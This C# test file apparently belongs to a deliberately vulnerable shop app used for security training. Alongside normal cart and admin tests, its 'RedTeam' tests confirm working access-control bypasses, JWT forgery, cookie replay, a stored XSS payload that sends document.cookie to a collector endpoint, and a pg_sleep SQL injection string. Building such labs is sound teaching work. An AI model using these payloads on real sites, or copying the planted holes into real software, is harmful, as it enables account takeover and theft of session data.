using System.Diagnostics;
using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using Npgsql;
using Xunit;

namespace MiniShop.Api.Tests;

[CollectionDefinition("PhaseOne", DisableParallelization = true)]
public sealed class PhaseOneCollection : ICollectionFixture<LabFactory> { }

[Collection("PhaseOne")]
[Trait("Category", "Integration")]
public sealed class PhaseOneTests(LabFactory factory)
{
    [Fact]
    public async Task Catalog_SeedAndHealth_AreAvailable()
    {
        using var client = factory.NewClient();
        Assert.Equal(HttpStatusCode.OK, (await client.GetAsync("/api/health")).StatusCode);
        var products = await LabHttp.Json(await client.GetAsync("/api/products"));
        Assert.True(products.GetArrayLength() >= 2);
        Assert.Contains(products.EnumerateArray(), p => p.GetProperty("id").GetInt32() == 1);
        Assert.Contains("Mini", await client.GetStringAsync("/"));
    }

    [Fact]
    public async Task Client_CartEditsAndCheckout_PersistOrderAndClearCart()
    {
        using var client = factory.NewClient();
        await LabHttp.Bearer(client, "cliente-xss", "LabXss2026!");
        var cart = await LabHttp.Json(await client.GetAsync("/api/cart/me"));
        var cartId = cart.GetProperty("id").GetInt32();
        var added = await client.PostAsJsonAsync($"/api/cart/{cartId}/items", new { productId = 1, quantity = 2 });
        added.EnsureSuccessStatusCode();
        cart = await LabHttp.Json(await client.GetAsync($"/api/cart/{cartId}"));
        var itemId = cart.GetProperty("items")[0].GetProperty("id").GetInt32();
        (await client.PutAsJsonAsync($"/api/cart/{cartId}/items/{itemId}", new { quantity = 3 })).EnsureSuccessStatusCode();
        var orderResponse = await client.PostAsJsonAsync("/api/orders", new { cartId });
        Assert.Equal(HttpStatusCode.Created, orderResponse.StatusCode);
        var order = await LabHttp.Json(orderResponse);
        var persisted = await LabHttp.Json(await client.GetAsync($"/api/orders/{order.GetProperty("id").GetInt32()}"));
        Assert.Equal(3, persisted.GetProperty("items")[0].GetProperty("quantity").GetInt32());
        Assert.Equal(750000, persisted.GetProperty("totalCents").GetInt64());
        Assert.Empty((await LabHttp.Json(await client.GetAsync($"/api/cart/{cartId}"))).GetProperty("items").EnumerateArray());
        Assert.Equal(HttpStatusCode.BadRequest, (await client.PostAsJsonAsync("/api/orders", new { cartId })).StatusCode);
        (await client.PostAsJsonAsync($"/api/cart/{cartId}/items", new { productId = 1, quantity = 1 })).EnsureSuccessStatusCode();
        cart = await LabHttp.Json(await client.GetAsync($"/api/cart/{cartId}"));
        itemId = cart.GetProperty("items")[0].GetProperty("id").GetInt32();
        Assert.Equal(HttpStatusCode.NoContent, (await client.DeleteAsync($"/api/cart/{cartId}/items/{itemId}")).StatusCode);
    }

    [Fact]
    public async Task Seller_ProductCrud_WorksButCannotPurchase()
    {
        using var client = factory.NewClient();
        await LabHttp.Bearer(client, "vendedor-lab", "LabSeller2026!");
        var created = await client.PostAsJsonAsync("/api/products", new { name = "Producto integración", description = "Ficticio", priceCents = 1234 });
        Assert.Equal(HttpStatusCode.Created, created.StatusCode);
        Assert.NotNull(created.Headers.Location);
        var product = await LabHttp.Json(created);
        var id = product.GetProperty("id").GetInt32();
        (await client.PutAsJsonAsync($"/api/products/{id}", new { name = "Producto actualizado", description = "Ficticio", priceCents = 2345 })).EnsureSuccessStatusCode();
        var products = await LabHttp.Json(await client.GetAsync("/api/products"));
        Assert.Contains(products.EnumerateArray(), p => p.GetProperty("id").GetInt32() == id && p.GetProperty("priceCents").GetInt32() == 2345);
        Assert.Equal(HttpStatusCode.Forbidden, (await client.GetAsync("/api/cart/me")).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden, (await client.PostAsJsonAsync("/api/orders", new { cartId = 1 })).StatusCode);
        Assert.Equal(HttpStatusCode.NoContent, (await client.DeleteAsync($"/api/products/{id}")).StatusCode);
        Assert.Equal(HttpStatusCode.NotFound, (await client.DeleteAsync($"/api/products/{id}")).StatusCode);
    }

    [Fact]
    public async Task Client_InvalidCartInputsAndProductWrites_AreRejected()
    {
        using var client = factory.NewClient();
        await LabHttp.Bearer(client);
        Assert.Equal(HttpStatusCode.BadRequest, (await client.PostAsJsonAsync("/api/cart/1/items", new { productId = 1, quantity = 0 })).StatusCode);
        Assert.Equal(HttpStatusCode.BadRequest, (await client.PutAsJsonAsync("/api/cart/1/items/1", new { quantity = -1 })).StatusCode);
        Assert.Equal(HttpStatusCode.BadRequest, (await client.PutAsJsonAsync("/api/cart/1/items/1", new { quantity = 100 })).StatusCode);
        var maximum = await LabHttp.Json(await client.PutAsJsonAsync("/api/cart/1/items/1", new { quantity = 99 }));
        Assert.Equal(99, maximum.GetProperty("items")[0].GetProperty("quantity").GetInt32());
        Assert.Equal(HttpStatusCode.Forbidden, (await client.PostAsJsonAsync("/api/products", new { name = "No permitido", description = "", priceCents = 100 })).StatusCode);
        Assert.Equal(HttpStatusCode.NotFound, (await client.GetAsync("/api/orders/999999")).StatusCode);
    }

    [Fact]
    public async Task Admin_ListsSyntheticDataButCannotChangeCustomerResourcesAndSellerCannotEditAdminProduct()
    {
        using var admin = factory.NewClient();
        await LabHttp.Bearer(admin, "admin-lab", "LabAdmin2026!");
        var overview = await LabHttp.Json(await admin.GetAsync("/api/admin"));
        Assert.Equal(6, overview.GetProperty("users").GetArrayLength());
        Assert.True(overview.GetProperty("orders").GetArrayLength() >= 2);
        Assert.Equal(HttpStatusCode.Forbidden, (await admin.PutAsJsonAsync("/api/cart/2/items/2", new { quantity = 9 })).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden, (await admin.PutAsJsonAsync("/api/orders/2", new { quantity = 9 })).StatusCode);
        var created = await LabHttp.Json(await admin.PostAsJsonAsync("/api/products", new { name = "Producto admin", description = "Sintético", priceCents = 1234 }));
        var id = created.GetProperty("id").GetInt32();
        using var seller = factory.NewClient();
        await LabHttp.Bearer(seller, "vendedor-lab", "LabSeller2026!");
        Assert.Equal(HttpStatusCode.Forbidden, (await seller.PutAsJsonAsync($"/api/products/{id}", new { name = "Ajeno", description = "", priceCents = 1 })).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden, (await seller.DeleteAsync($"/api/products/{id}")).StatusCode);
        (await admin.PutAsJsonAsync($"/api/products/{id}", new { name = "Actualizado admin", description = "", priceCents = 2345 })).EnsureSuccessStatusCode();
        Assert.Equal(HttpStatusCode.NoContent, (await admin.DeleteAsync($"/api/products/{id}")).StatusCode);
    }

    [Fact]
    public async Task RedTeam_ClientCanReadAndChangeOtherClientsCartAndOrder()
    {
        using var client = factory.NewClient();
        await LabHttp.Bearer(client);
        var own = await LabHttp.Json(await client.GetAsync("/api/cart/1"));
        var other = await LabHttp.Json(await client.GetAsync("/api/cart/2"));
        Assert.NotEqual(own.GetProperty("userId").GetInt32(), other.GetProperty("userId").GetInt32());
        Assert.Equal(2, other.GetProperty("userId").GetInt32());
        (await client.PutAsJsonAsync("/api/cart/2/items/2", new { quantity = 7 })).EnsureSuccessStatusCode();
        other = await LabHttp.Json(await client.GetAsync("/api/cart/2"));
        Assert.Equal(7, other.GetProperty("items")[0].GetProperty("quantity").GetInt32());
        var order = await LabHttp.Json(await client.GetAsync("/api/orders/2"));
        Assert.Equal(2, order.GetProperty("userId").GetInt32());
        (await client.PutAsJsonAsync("/api/orders/2", new { quantity = 4 })).EnsureSuccessStatusCode();
        order = await LabHttp.Json(await client.GetAsync("/api/orders/2"));
        Assert.Equal(4, order.GetProperty("items")[0].GetProperty("quantity").GetInt32());
    }

    [Fact]
    public async Task RedTeam_LoginEnumeratesAccountsAndAllowsFiveSequentialAttempts()
    {
        using var client = factory.NewClient();
        var missing = await client.PostAsJsonAsync("/api/auth/login", new { username = "no-existe-lab", password = "Incorrecta!" });
        var wrong = await client.PostAsJsonAsync("/api/auth/login", new { username = "cliente-brute", password = "Incorrecta!" });
        Assert.Equal(HttpStatusCode.Unauthorized, missing.StatusCode);
        Assert.Equal(HttpStatusCode.Unauthorized, wrong.StatusCode);
        Assert.NotEqual(await missing.Content.ReadAsStringAsync(), await wrong.Content.ReadAsStringAsync());
        for (var attempt = 0; attempt < 4; attempt++)
            Assert.Equal(HttpStatusCode.Unauthorized, (await client.PostAsJsonAsync("/api/auth/login", new { username = "cliente-brute", password = "incorrecta" + attempt })).StatusCode);
        var accepted = await client.PostAsJsonAsync("/api/auth/login", new { username = "cliente-brute", password = "LabPass2026!" });
        Assert.Equal(HttpStatusCode.OK, accepted.StatusCode);
    }

    [Fact]
    public async Task RedTeam_WeakSignedJwtElevatesRoleButWrongSignatureIsRejected()
    {
        using var client = factory.NewClient();
        var original = await LabHttp.Bearer(client);
        Assert.Equal(HttpStatusCode.Forbidden, (await client.GetAsync("/api/admin")).StatusCode);
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", LabHttp.ForgeAdmin(original));
        var admin = await LabHttp.Json(await client.GetAsync("/api/admin"));
        Assert.True(admin.GetProperty("users").GetArrayLength() >= 6);
        Assert.DoesNotContain("passwordHash", admin.ToString(), StringComparison.OrdinalIgnoreCase);
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", LabHttp.ForgeAdmin(original, "wrong-key"));
        Assert.Equal(HttpStatusCode.Unauthorized, (await client.GetAsync("/api/admin")).StatusCode);
    }

    [Fact]
    public async Task RedTeam_CookieIsReadableAndReplayShowsVictimIdentity()
    {
        using var victim = factory.NewClient();
        var login = await LabHttp.Cookie(victim, "cliente-xss", "LabXss2026!");
        Assert.Equal(HttpStatusCode.Redirect, login.StatusCode);
        var cookie = Assert.Single(login.Headers.GetValues("Set-Cookie"), c => c.StartsWith("LabSession="));
        Assert.DoesNotContain("httponly", cookie, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("; secure", cookie, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("samesite=lax", cookie, StringComparison.OrdinalIgnoreCase);
        using var replay = factory.NewClient();
        replay.DefaultRequestHeaders.Add("Cookie", cookie.Split(';')[0]);
        var profile = await replay.GetStringAsync("/Account/Profile");
        Assert.Contains("cliente-xss", profile);
    }

    [Fact]
    public async Task RedTeam_ClientCookieReachesAdminButAnonymousCannot()
    {
        using var client = factory.NewClient();
        Assert.Equal(HttpStatusCode.Unauthorized, (await client.GetAsync("/api/admin")).StatusCode);
        (await LabHttp.Cookie(client, "cliente-a", "LabClienteA2026!")).EnsureSuccessOrRedirect();
        Assert.Equal(HttpStatusCode.OK, (await client.GetAsync("/api/admin")).StatusCode);
    }

    [Fact]
    public async Task RedTeam_StoredCommentRendersRawAndCollectorDoesNotPersist()
    {
        using var client = factory.NewClient();
        await LabHttp.Bearer(client);
        const string body = "<img src=x onerror=\"fetch('/lab/collect?c='+encodeURIComponent(document.cookie))\">";
        Assert.Equal(HttpStatusCode.Created, (await client.PostAsJsonAsync("/api/products/1/comments", new { body })).StatusCode);
        var comments = await LabHttp.Json(await client.GetAsync("/api/products/1/comments"));
        Assert.Contains(comments.EnumerateArray(), c => c.GetProperty("body").GetString() == body);
        Assert.Contains(body, await client.GetStringAsync("/Products/Details/1"));
        var before = comments.GetArrayLength();
        Assert.Equal(HttpStatusCode.NoContent, (await client.GetAsync("/lab/collect?c=synthetic-cookie-marker")).StatusCode);
        comments = await LabHttp.Json(await client.GetAsync("/api/products/1/comments"));
        Assert.Equal(before, comments.GetArrayLength());
        Assert.DoesNotContain("synthetic-cookie-marker", comments.ToString());
    }

    [Fact]
    public async Task RedTeam_SearchTimeSignalUsesRestrictedReadOnlyPrincipal()
    {
        using var client = factory.NewClient();
        (await client.GetAsync("/api/products/search?q=demo")).EnsureSuccessStatusCode();
        var watch = Stopwatch.StartNew();
        var baseline = await client.GetAsync("/api/products/search?q=demo");
        baseline.EnsureSuccessStatusCode();
        var baselineTime = watch.Elapsed;
        watch.Restart();
        // A nonmatching prefix forces evaluation rather than letting ILIKE '%'
        // satisfy the OR before PostgreSQL evaluates the delayed subquery.
        var delayed = await client.GetAsync("/api/products/search?q=" + Uri.EscapeDataString("no-match' OR (SELECT 1 FROM pg_sleep(1))=1 --"));
        delayed.EnsureSuccessStatusCode();
        Assert.True(watch.Elapsed - baselineTime > TimeSpan.FromMilliseconds(700), "Injected pg_sleep must have a measurable local signal.");
        await using var search = new NpgsqlConnection(factory.SearchConnection);
        await search.OpenAsync();
        await using var permissions = new NpgsqlCommand("SELECT current_user, has_table_privilege(current_user, '\"Products\"', 'SELECT'), has_table_privilege(current_user, '\"Products\"', 'UPDATE'), has_table_privilege(current_user, '\"Users\"', 'SELECT')", search);
        await using var reader = await permissions.ExecuteReaderAsync();
        Assert.True(await reader.ReadAsync());
        Assert.Equal("minishop_search", reader.GetString(0));
        Assert.True(reader.GetBoolean(1));
        Assert.False(reader.GetBoolean(2));
        Assert.False(reader.GetBoolean(3));
        await reader.DisposeAsync();
        await using var deniedWrite = new NpgsqlCommand("UPDATE \"Products\" SET \"PriceCents\" = 1 WHERE false", search);
        var denied = await Assert.ThrowsAsync<PostgresException>(() => deniedWrite.ExecuteNonQueryAsync());
        Assert.Equal(PostgresErrorCodes.InsufficientPrivilege, denied.SqlState);
    }
}

internal static class ResponseAssertions
{
    public static void EnsureSuccessOrRedirect(this HttpResponseMessage response) => Assert.True(response.IsSuccessStatusCode || response.StatusCode == HttpStatusCode.Redirect);
}
